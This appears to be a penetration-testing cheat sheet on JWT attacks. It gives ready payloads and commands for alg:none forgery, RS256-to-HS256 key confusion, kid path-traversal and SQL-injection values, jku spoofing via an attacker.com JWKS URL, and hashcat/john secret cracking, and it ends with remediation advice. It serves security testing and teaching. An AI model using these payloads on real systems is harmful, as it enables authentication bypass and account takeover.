# JWT Attacks

Base64url-decode the three segments. Look at `alg`, `kid`, `jku`, `x5u`, `cty`, `typ` in the header.

## Quick decode

```bash
jwt_tool <token> -I   # info
jwt_tool <token> -T   # tamper
# Or
python3 -c "import base64,sys,json; h,p,_=sys.argv[1].split('.'); \
  print(json.dumps(json.loads(base64.urlsafe_b64decode(h+'==')),indent=2)); \
  print(json.dumps(json.loads(base64.urlsafe_b64decode(p+'==')),indent=2))" <token>
```

## alg:none

Some libraries honor `"alg":"none"` and skip signature verification.

```bash
# Header: {"alg":"none","typ":"JWT"}
# Payload: modified claims
# Signature: empty
jwt_tool <token> -X a
```

Variants to try: `None`, `NONE`, `nOnE`. Also `alg:""`.

## Algorithm confusion (RS256 → HS256)

If server accepts HS256 when public key is the secret:

```bash
jwt_tool <token> -X k -pk public.pem
# Or manual: sign payload with HMAC-SHA256 using the RSA public key bytes as secret
```

Get the public key from `/.well-known/jwks.json`, OIDC config, or JWT library defaults.

## kid injection

`kid` often maps to a file path or DB lookup.

- Path traversal: `"kid":"../../../../dev/null"` → server reads empty file as key → sign with empty secret.
- SQL injection: `"kid":"x' UNION SELECT 'mysecret"` — rare but historical.
- Command injection in rare `kid`-to-shell flows.

## jku / x5u spoof

`jku` points to a JWKS URL used for verification.

- Set `"jku":"https://attacker.com/jwks.json"` — works if no allowlist.
- Try open redirect on target: `"jku":"https://target.com/redirect?url=https://attacker.com/jwks.json"`.
- Host your jwks.json with a public key whose private key you control.

```json
// jwks.json
{ "keys":[{"kty":"RSA","kid":"1","n":"...","e":"AQAB"}] }
```

## Weak HS256 brute

```bash
hashcat -m 16500 token.txt jwt.secrets.list
john --format=HMAC-SHA256 token.txt --wordlist=rockyou.txt
```

Known wordlist: `jwt-secrets.txt` from `rzepsky/JWT-Cracker-List` and `wallarm/jwt-secrets`.

## Expiry / nbf / iat

- Not-checked `exp` → forever-valid tokens.
- Negative `nbf` or `iat` in the future → sometimes accepted.
- `exp` as string vs int → type confusion in strict parsers.

## Claim smuggling

- Duplicate claims: `{"sub":"user","sub":"admin"}` — different parsers pick different.
- Nested objects where server expected string.
- `"role":["user","admin"]` vs `"role":"admin"`.

## Remediation

- Force one algorithm server-side; never read `alg` from the token.
- Bind HS* secrets distinct from public keys.
- Validate `kid` against allowlist; never dereference to filesystem.
- Strict JWKS allowlist for `jku`/`x5u`; pin to own issuer.
- Enforce `exp`, `nbf`, `iss`, `aud`.

## References

- jwt_tool — https://github.com/ticarpi/jwt_tool
- PortSwigger Academy JWT — https://portswigger.net/web-security/jwt
- jwt.io — https://jwt.io
